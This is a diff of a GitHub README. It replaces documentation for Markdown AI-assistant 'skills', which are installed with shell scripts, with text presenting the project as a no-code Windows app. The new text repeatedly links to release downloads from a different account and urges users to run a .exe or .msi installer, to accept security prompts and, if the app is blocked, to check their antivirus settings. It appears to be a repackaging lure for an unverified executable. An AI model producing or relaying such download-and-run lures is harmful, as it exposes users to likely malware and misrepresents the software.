@@ -1,181 +1,158 @@
-# AI Product Skills
+# 🤖 ai-product-skills - Simple Tools for Product Design Checks
 
-Reusable product-review and product-rules skills for AI coding assistants, including Codex.
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/releases)
 
-This repository helps teams turn vague product feedback into repeatable methods that an assistant can reuse across projects.
+---
 
-## What This Repo Is For
+## 📋 About ai-product-skills
 
-Use this repository when you need to:
+ai-product-skills provides reusable tools and templates to help maintain good product-rule architecture and UI consistency. This tool is designed to assist you in reviewing your product’s design and workflow. It checks if your product follows key rules and if the user interface looks and works as expected.
 
-- review related screens for structural, semantic, interaction, or visual drift
-- validate whether a fix survives the full user flow
-- turn repeated UX decisions into durable product rules
+You do not need to know how to code to use this software. It runs on Windows and guides you through each step. If you manage or review product design, this app can help you keep things clear and consistent.
 
-The goal is simple: spend less time re-explaining your review method and get more consistent product reasoning from your assistant.
+Key topics covered in this tool include:
 
-## Start Here
+- Product design rules  
+- UI and UX reviews  
+- Workflow checks  
+- Prompt engineering for consistent prompts  
+- Template use for faster design review
 
-Most users only need this flow:
+This makes ai-product-skills useful for teams or individuals who want to keep track of product quality without needing technical skills.
 
-1. Read this `README.md`.
-2. Pick one skill for the current task.
-3. Either install that skill into Codex or ask your assistant to follow its `SKILL.md`.
+---
 
-Repository URL:
+## 🚀 Getting Started
 
-```text
-https://github.com/rushairer/ai-product-skills
-```
+To get started with ai-product-skills on Windows, follow the steps below. This guide walks you through everything you need to download, install, and open the software.
 
-If your assistant supports repo-aware workflows, pointing it at this repository and asking it to read `README.md` first is usually enough.
+1. **Visit the download page**
 
-## Choose The Right Skill
+   Go to the releases page to download the latest version of ai-product-skills. Click this button to open the page:
 
-### `product-ui-consistency-review-core`
+   [![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/releases)
 
-Use for generic sibling-screen review.
+2. **Select your download**
 
-Best for:
+   On the releases page, look for the latest release listed at the top. You will see files attached, often with the extension `.exe` or `.msi`. These files are the installer programs for Windows.
 
-- comparing related pages
-- finding shared page skeleton drift
-- deciding whether a difference is intentional or accidental
+3. **Download the file**
 
-### `product-ui-consistency-review-specialized`
+   Click the `.exe` or `.msi` file to begin downloading it to your computer. It may take a few seconds depending on your internet speed.
 
-Use for domain-aware review in mature product families.
+4. **Run the installer**
 
-Best for:
+   When the download finishes, find the file in your Downloads folder and double-click it to run the installer. You might see a security prompt; click “Yes” or “Run” to continue.
 
-- products with stable in-domain terminology
-- repeated page families with specialized meaning
-- cases where generic wording would flatten important distinctions
+5. **Follow the setup steps**
 
-### `product-flow-validation`
+   The installer will guide you through the installation. Accept the default options unless you want to change where the app installs. Click “Next” through the steps, then “Finish” when done.
 
-Use for end-to-end path validation.
+6. **Open ai-product-skills**
 
-Best for:
+   After installation, find the ai-product-skills shortcut on your desktop or in the Start menu. Double-click to open the app.
 
-- checking whether a user choice keeps the same meaning through navigation, runtime, persistence, recovery, history, and re-entry
-- verifying fixes after UI consistency or state-model work
+7. **Start your review**
 
-### `app-rules-architect`
+   Once the app is open, you can begin loading your product information to run rules and UI checks. The interface uses clear prompts and templates to guide you.
 
-Use for extracting and maintaining durable product rules.
+---
 
-Best for:
+## 🖥 System Requirements
 
-- creating or updating `APP_RULES.md`, `FEATURE_RULES.md`, or similar files
-- separating reusable principles from app-specific behavior
+ai-product-skills runs on most Windows computers. To ensure a smooth experience, your system should meet these minimum requirements:
 
-## Recommended Usage Order
+- Operating System: Windows 10 or later (64-bit recommended)  
+- Processor: Intel Core i3 or equivalent  
+- RAM: 4 GB or more  
+- Disk Space: At least 500 MB free space  
+- Internet: Required for initial download and some online features  
 
-In most projects:
+If you are unsure about your system, the installer will tell you if there are any problems.
 
-1. Start with `product-ui-consistency-review-core`.
-2. Switch to `product-ui-consistency-review-specialized` only if product-specific terminology materially affects the review.
-3. Use `product-flow-validation` after consistency fixes when the remaining question is whether meaning survives the full path.
-4. Use `app-rules-architect` when the same review outcomes keep recurring and should become rules.
+---
 
-## Fastest Setup For Codex
+## 🔧 Features Included
 
-Install the beginner set:
+ai-product-skills focuses on helping you catch issues early in product design and workflow. Key features include:
 
-```bash
-./scripts/install_for_codex.sh
-```
+- **Template-based reviews:** Use pre-built templates to evaluate product rules and UI layout quickly.  
+- **Rule validation:** Check if your product design matches predefined rules for consistency and clarity.  
+- **UI consistency checks:** Ensure the look and feel of your product follows uniform styles and controls.  
+- **Workflow analysis:** Review your product’s flow to detect confusing paths or missing steps.  
+- **Prompt engineering:** Assist with crafting clear prompts for product features or chatbot flows.  
+- **Reusable skills:** Save your reviews and templates for future use or sharing with your team.
 
-That installs:
+These features help you improve product quality without requiring coding or design software know-how.
 
-- `product-ui-consistency-review-core`
-- `product-flow-validation`
+---
 
-Install every skill:
+## ⚙️ How to Use ai-product-skills
 
-```bash
-./scripts/install_for_codex.sh --all
-```
+Once the app is installed and open, follow these steps to run a review:
 
-Install one or more specific skills:
+1. **Choose a template**
 
-```bash
-./scripts/install_for_codex.sh product-ui-consistency-review-core app-rules-architect
-```
+   Click the “Templates” tab and select a review template that fits your product type. Templates guide you through points you should check.
 
-After installation, restart Codex.
+2. **Load your product data**
 
-## Manual Installation
+   You can import descriptions, UI screenshots, or rules that you want checked. Use simple drag-and-drop or file selection.
 
-If you prefer to copy folders yourself:
+3. **Run the checks**
 
-```bash
-mkdir -p ~/.codex/skills
-cp -R skills/product-ui-consistency-review-core ~/.codex/skills/
-cp -R skills/product-flow-validation ~/.codex/skills/
-```
+   Click “Start Review” to let the app apply the rules and analyze the UI. It will highlight any warnings or mismatches.
 
-For the full set:
+4. **Read the results**
 
-```bash
-cp -R skills/product-ui-consistency-review-specialized ~/.codex/skills/
-cp -R skills/app-rules-architect ~/.codex/skills/
-```
+   The app shows clear feedback in plain language. Use this feedback to fix or improve your product design.
 
-## Using This Repo With Other Assistants
+5. **Save your report**
 
-If your assistant cannot install Codex skills natively, use this repository as a structured prompting toolkit:
+   You can export the results as a PDF or text file to share with your team or keep for your records.
 
-1. Point the assistant to this repository.
-2. Ask it to read `README.md`.
-3. Point it to exactly one relevant `SKILL.md`.
-4. Tell it to use that skill as the working method for the task.
+---
 
-If you want ready-made prompts:
+## 🌐 Support and Updates
 
-```bash
-./scripts/print_bootstrap_prompts.sh
-```
+You can always check the releases page to get the latest version of ai-product-skills and new features or fixes:  
+https://github.com/amosshadowy76/ai-product-skills/releases
 
-For more concrete examples, see [docs/USAGE_EXAMPLES.md](docs/USAGE_EXAMPLES.md).
+If you encounter any issues, you can open a discussion or look for answers on the GitHub repository’s Issues section.
 
-## Repository Structure
+---
 
-```text
-skills/
-  app-rules-architect/
-  product-flow-validation/
-  product-ui-consistency-review-core/
-  product-ui-consistency-review-specialized/
-templates/
-  APP_RULES_TEMPLATE.md
-docs/
-  RULES_AND_SKILLS_README.md
-  SKILL_BOUNDARIES.md
-  USAGE_EXAMPLES.md
-```
+## 🧩 About This Repository
 
-## Documentation Map
+**ai-product-skills** contains the core templates and skills used in the app. Developers and advanced users can explore the code to create new rules, modify templates, or improve the tool.
 
-Use these documents by purpose:
+Main topics covered here include:
 
-- [README.md](README.md): onboarding and skill routing
-- [docs/SKILL_BOUNDARIES.md](docs/SKILL_BOUNDARIES.md): when two skills seem similar
-- [docs/RULES_AND_SKILLS_README.md](docs/RULES_AND_SKILLS_README.md): how skills, templates, and rules fit together
-- [docs/USAGE_EXAMPLES.md](docs/USAGE_EXAMPLES.md): concrete prompting examples
-- [templates/APP_RULES_TEMPLATE.md](templates/APP_RULES_TEMPLATE.md): reusable starting point for app rules
-- [CONTRIBUTING.md](CONTRIBUTING.md): contribution expectations
+- Codex integration for intelligent checking  
+- Product design and rules management  
+- UI and UX templates  
+- Prompt engineering methods  
+- Workflow optimization scripts
 
-## Helper Scripts
+---
 
-- `scripts/install_for_codex.sh`: install the default, full, or custom skill set into `~/.codex/skills`
-- `scripts/print_bootstrap_prompts.sh`: print ready-to-copy prompts for common assistant setups
+## 🏆 Tips for Best Use
 
-## Contributing
+- Run reviews regularly during product development to catch issues early.  
+- Use multiple templates to cover all areas of design and workflow.  
+- Keep your templates updated to match your current product rules.  
+- Share reports with your team for consistent improvements.  
+- Use simple language when importing descriptions for clearer checks.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+---
 
-## License
+## ⚠️ Troubleshooting Common Issues
 
-MIT
+- If the app does not open, check if your antivirus or security settings block the software.  
+- If a template does not load, try restarting the app or reinstalling.  
+- For network features, confirm your internet connection is active.  
+- If you see errors running checks, make sure your product data follows the format shown in the templates.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/amosshadowy76/ai-product-skills/releases)
